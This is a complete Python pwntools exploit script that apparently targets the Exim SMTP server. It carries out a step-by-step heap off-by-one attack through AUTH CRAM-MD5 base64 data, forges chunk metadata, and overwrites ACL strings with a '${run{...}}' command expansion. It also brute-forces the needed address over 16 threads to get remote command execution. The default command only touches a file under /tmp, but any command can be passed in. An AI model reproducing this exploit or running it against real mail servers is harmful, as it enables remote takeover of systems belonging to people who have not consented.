#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *
import time
from base64 import b64encode
from threading import Thread
  
   
def ehlo(tube, who):
    time.sleep(0.2)
    tube.sendline("ehlo "+who)
    tube.recv()

def docmd(tube, command):
    time.sleep(0.2)
    tube.sendline(command)
    tube.recv()

def auth(tube, command):
    time.sleep(0.2)
    tube.sendline("AUTH CRAM-MD5")
    tube.recv()
    time.sleep(0.2)
    tube.sendline(command)
    tube.recv()


isEnd = False
def execute_command(try_addr, command="/usr/bin/touch /tmp/iyoooo"):
    global ip
    context.log_level='warning'
    s = remote(ip, 25)
    #s.set_debuglevel(1)
    # 1. put a huge chunk into unsorted bin 
    log.info("send ehlo")
    ehlo(s, "a"*0x1000) # 0x2020
    ehlo(s, "a"*0x20)
    # 2. cut the first storeblock by unknown command
    log.info("send unknown command")
    docmd(s, "\xee"*0x700)

    # 3. cut the second storeblock and release the first one
    log.info("send ehlo again to cut storeblock")
    ehlo(s, "c"*0x2c00)

    # 4. send base64 data and trigger off-by-one
    log.info("overwrite one byte of next chunk")
    docmd(s, "AUTH CRAM-MD5")
    payload = "d"*(0x2020+0x30-0x18-1)
    docmd(s, b64encode(payload)+"EfE")

    # 5. forge chunk size
    log.info("forge chunk size")
    docmd(s, "AUTH CRAM-MD5")
    payload2 = 'm'*0x70+p64(0x1f41) # modify fake size
    docmd(s, b64encode(payload2))

    # 6. relase extended chunk
    log.info("resend ehlo")
    ehlo(s, "skysider+")
    
    # 7. overwrite next pointer of overlapped storeblock
    log.info("overwrite next pointer of overlapped storeblock")
    docmd(s, "AUTH CRAM-MD5")
    payload3 = 'a'*0x2bf0 + p64(0) + p64(0x2021) + p8(0x80)
    try:
        try_addr = p16(try_addr*0x10+4)  # to change
        docmd(s, b64encode(payload3)+b64encode(try_addr)[:-1]) # fake chunk header and storeblock next
        # 8. reset storeblocks and retrive the ACL storeblock
        log.info("reset storeblock")
        ehlo(s, "crashed")
        # 9. overwrite acl strings
        log.info("overwrite acl strings")
        payload4 = 'a'*0x18 + p64(0xb1) + 't'*(0xb0-0x10) + p64(0xb0) + p64(0x1f40)
        payload4 += 't'*(0x1f80-len(payload4))
        auth(s, b64encode(payload4)+'ee')
        payload5 = "a"*0x78 + "${run{" + command + "}}\x00"
        auth(s, b64encode(payload5)+"ee")

        # 10. trigger acl check
        log.info("trigger acl check and execute command")
        s.sendline("MAIL FROM: <test@163.com>")
        s.close()
        return 1
    except:
        s.close()
        return 0


def brute_force(left, right):
    global isEnd
    for i in range(left, right):
        if isEnd:
            break
        log.warn("testing 0x%x" % i)
        res = execute_command(i)
        while res < 0:
            res = execute_command(i)
        if res == 1:
            print("success: 0x%x" % i)
            isEnd = True
            break

ip = "127.0.0.1"
def threaded_brute_force(num_threads=8):
    threads = []
    step = 0x1000/num_threads
    start_addr = 0x0
    for i in range(num_threads):
        t = Thread(target=brute_force, args=(start_addr, start_addr+step))
        threads.append(t)
        t.start()
        start_addr += step

threaded_brute_force(0x10)
# execute_command(0xe7f, '/usr/bin/touch /tmp/s')




